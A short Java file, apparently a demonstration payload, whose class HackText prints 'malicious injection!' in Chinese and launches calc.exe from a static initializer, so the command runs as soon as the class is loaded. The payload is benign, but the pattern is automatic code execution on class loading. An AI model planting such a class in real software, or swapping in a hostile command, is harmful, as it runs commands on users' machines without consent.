package com.example.demo.hacker;

import java.io.IOException;

public class HackText {
    static {
        System.out.println("恶意注入！");
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
